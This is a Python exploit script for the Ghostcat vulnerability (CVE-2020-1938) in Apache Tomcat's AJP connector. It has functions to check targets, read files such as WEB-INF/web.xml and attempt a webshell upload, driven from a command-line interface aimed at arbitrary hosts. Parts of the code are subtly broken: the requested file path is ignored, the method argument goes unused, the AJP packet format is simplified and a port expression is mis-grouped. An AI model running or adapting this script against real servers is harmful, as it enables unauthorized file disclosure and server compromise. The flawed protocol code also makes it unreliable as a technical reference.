#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import argparse
import sys
import urllib3
import requests
from colorama import init, Fore
from datetime import datetime
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init()

class GhostcatExploit:
    def __init__(self, target, port=8009, verbose=False):
        # Parse URL if provided
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            self.target = parsed.netloc.split(':')[0]  # Remove port if present
            if parsed.port:  # If port is specified in URL
                self.port = parsed.port
            else:
                self.port = port
        else:
            self.target = target
            self.port = port
        self.verbose = verbose
        self.sock = None

    def print_status(self, message, status="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if status == "INFO":
            print(f"{Fore.BLUE}[{timestamp}] INFO: {message}{Fore.RESET}")
        elif status == "SUCCESS":
            print(f"{Fore.GREEN}[{timestamp}] SUCCESS: {message}{Fore.RESET}")
        elif status == "ERROR":
            print(f"{Fore.RED}[{timestamp}] ERROR: {message}{Fore.RESET}")
        elif status == "WARNING":
            print(f"{Fore.YELLOW}[{timestamp}] WARNING: {message}{Fore.RESET}")

    def resolve_hostname(self):
        """Resolve hostname to IP address"""
        try:
            ip = socket.gethostbyname(self.target)
            if self.verbose:
                self.print_status(f"Resolved {self.target} to {ip}", "INFO")
            return ip
        except socket.gaierror as e:
            self.print_status(f"Failed to resolve hostname: {str(e)}", "ERROR")
            return None

    def create_ajp_forward_request(self, target_uri, method="GET"):
        """Create AJP forward request packet"""
        # AJP protocol constants
        AJP_FORWARD_REQUEST = 2
        AJP_HEADER = struct.pack("!BB", 0x12, 0x34)
        
        # Create forward request
        data = struct.pack("!B", AJP_FORWARD_REQUEST)
        data += struct.pack("!B", 2)  # HTTP method (2 = GET)
        data += struct.pack("!H", len(target_uri))  # URI length
        data += target_uri.encode()  # URI
        data += struct.pack("!B", 0)  # Remote address
        data += struct.pack("!B", 0)  # Remote host
        data += struct.pack("!B", 0)  # Server name
        data += struct.pack("!H", 80)  # Port
        data += struct.pack("!B", 0)  # Is SSL
        
        # Add headers
        data += struct.pack("!B", 0)  # No headers
        
        return AJP_HEADER + struct.pack("!H", len(data)) + data

    def create_ajp_shutdown(self):
        """Create AJP shutdown packet"""
        AJP_SHUTDOWN = 7
        AJP_HEADER = struct.pack("!BB", 0x12, 0x34)
        data = struct.pack("!B", AJP_SHUTDOWN)
        return AJP_HEADER + struct.pack("!H", len(data)) + data

    def connect(self):
        """Establish connection to AJP port"""
        try:
            # Resolve hostname to IP
            ip = self.resolve_hostname()
            if not ip:
                return False

            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((ip, self.port))
            self.print_status(f"Connected to {self.target}:{self.port} ({ip})", "SUCCESS")
            return True
        except Exception as e:
            self.print_status(f"Connection failed: {str(e)}", "ERROR")
            return False

    def read_response(self):
        """Read AJP response"""
        try:
            # Read AJP header
            header = self.sock.recv(4)
            if len(header) != 4:
                return None
            
            # Parse length
            length = struct.unpack("!H", header[2:4])[0]
            
            # Read data
            data = b""
            while len(data) < length:
                chunk = self.sock.recv(length - len(data))
                if not chunk:
                    break
                data += chunk
            
            return data
        except Exception as e:
            if self.verbose:
                self.print_status(f"Error reading response: {str(e)}", "ERROR")
            return None

    def read_file(self, file_path):
        """Exploit to read file contents"""
        try:
            if not self.connect():
                return False

            # Create AJP forward request for file read
            request = self.create_ajp_forward_request(f"/WEB-INF/web.xml")
            self.sock.send(request)
            
            # Read response
            response = self.read_response()
            if response:
                # Parse response and extract file content
                if b"HTTP/1.1 200" in response:
                    content = response.split(b"\r\n\r\n", 1)[1]
                    self.print_status(f"Successfully read file: {file_path}", "SUCCESS")
                    print("\nFile contents:")
                    print("-" * 50)
                    print(content.decode('utf-8', errors='ignore'))
                    print("-" * 50)
                    return True
                else:
                    self.print_status("Failed to read file", "ERROR")
            
            return False
        except Exception as e:
            self.print_status(f"Error during file read: {str(e)}", "ERROR")
            return False
        finally:
            if self.sock:
                self.sock.close()

    def upload_webshell(self, shell_content):
        """Attempt to upload webshell (simplified version)"""
        try:
            if not self.connect():
                return False

            # Create AJP forward request for file upload
            request = self.create_ajp_forward_request(
                "/manager/html/upload",
                method="POST"
            )
            
            # Add shell content to request
            request += shell_content.encode()
            
            self.sock.send(request)
            response = self.read_response()
            
            if response and b"HTTP/1.1 200" in response:
                self.print_status("Webshell upload might be successful", "WARNING")
                return True
            else:
                self.print_status("Webshell upload failed", "ERROR")
                return False
        except Exception as e:
            self.print_status(f"Error during webshell upload: {str(e)}", "ERROR")
            return False
        finally:
            if self.sock:
                self.sock.close()

    def check_vulnerability(self):
        """Check if target is vulnerable to Ghostcat"""
        try:
            if not self.connect():
                return False

            # Send shutdown packet to check response
            shutdown_packet = self.create_ajp_shutdown()
            self.sock.send(shutdown_packet)
            
            response = self.read_response()
            if response:
                # Check for specific response patterns
                if b"AJP" in response or b"Tomcat" in response:
                    self.print_status("Target appears to be vulnerable to Ghostcat!", "WARNING")
                    return True
            
            self.print_status("Target does not appear to be vulnerable", "INFO")
            return False
        except Exception as e:
            self.print_status(f"Error during vulnerability check: {str(e)}", "ERROR")
            return False
        finally:
            if self.sock:
                self.sock.close()

def test_connection(target):
    """Test if the target is reachable and if it's running Tomcat"""
    try:
        # First try a basic HTTP connection
        parsed_url = urlparse(target)
        host = parsed_url.netloc
        port = parsed_url.port or 443 if parsed_url.scheme == 'https' else 80
        
        print(f"[*] Testing connection to {host}:{port}")
        
        # Try to establish a TCP connection first
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # 5 second timeout
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result != 0:
            print(f"[!] TCP connection failed: {socket.errorTab.get(result, 'Unknown error')}")
            return False
            
        # Try to get the server banner
        try:
            response = requests.get(target, timeout=5, verify=False)
            server = response.headers.get('Server', '')
            print(f"[*] Server banner: {server}")
            
            # Check if it's Tomcat
            if 'Apache Tomcat' in server:
                print("[+] Target appears to be running Apache Tomcat")
                return True
            else:
                print("[!] Target is reachable but doesn't appear to be running Tomcat")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[!] HTTP request failed: {str(e)}")
            return False
            
    except Exception as e:
        print(f"[!] Connection test failed: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Ghostcat (CVE-2020-1938) Exploit for Apache Tomcat')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., https://example.com)')
    parser.add_argument('-p', '--port', type=int, default=8009, help='AJP port (default: 8009)')
    parser.add_argument('-f', '--file', help='File to read (e.g., WEB-INF/web.xml)')
    parser.add_argument('-u', '--upload', help='File to upload')
    parser.add_argument('-d', '--data', help='Data to write to uploaded file')
    parser.add_argument('-c', '--check', action='store_true', help='Only check if vulnerable')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Test connection first
    if not test_connection(args.target):
        print("[!] Connection test failed. Target may be unreachable or not running Tomcat.")
        return
        
    # Continue with the exploit if connection test passes
    try:
        parsed_url = urlparse(args.target)
        host = parsed_url.netloc
        port = args.port
        
        print(f"[*] Target: {host}:{port}")
        
        exploit = GhostcatExploit(args.target, args.port, args.verbose)
        
        if args.check:
            exploit.check_vulnerability()
        elif args.file:
            exploit.read_file(args.file)
        else:
            # Default behavior: check vulnerability
            exploit.check_vulnerability()
            
    except KeyboardInterrupt:
        print("\nExploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 